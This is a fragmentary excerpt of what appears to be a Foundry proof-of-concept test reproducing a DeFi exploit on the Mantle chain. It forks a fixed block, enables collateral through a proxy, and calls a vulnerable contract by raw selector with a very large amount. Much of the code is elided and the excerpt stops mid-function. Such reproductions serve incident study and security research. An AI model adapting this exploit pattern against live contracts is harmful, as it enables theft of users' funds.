...
contract Exploit is Test {
    ...
    function setUp() public {
        vm.createSelectFork("mantle", 66_416_576);
    }
    ...
    function testExpolit() public {
        ...
        (bool success,) = address(Proxy).call(abi.encodeWithSignature("enableAsCollateral(address[])", addressArray));

        require(success, "Failed to enable collateral");
        (bool sucess2,) = address(vulncontract).call(
            abi.encodeWithSelector(bytes4(0x490e6cbc), address(this), 0, 4_265_391_252_891_663_973_703_824, "")
        );
        require(sucess2, "Failed to call vulncontract");
